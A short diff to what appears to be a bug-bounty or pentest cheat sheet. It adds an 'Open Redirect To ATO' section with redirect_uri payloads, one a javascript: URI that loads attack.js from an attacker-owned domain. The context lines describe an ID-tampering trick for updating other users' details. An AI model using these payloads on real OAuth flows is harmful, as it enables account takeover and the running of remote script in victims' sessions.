@@ -130,3 +130,8 @@ it works when json is being used to transfer and receive data.
 add 0 in id and update details for any specific user
 
 ```
+### Open Redirect To ATO
+```bash
+redirect_uri=https://example.com
+redirect_uri=javascript:$.getScript`https://my_own_domain/attack.js`
+```
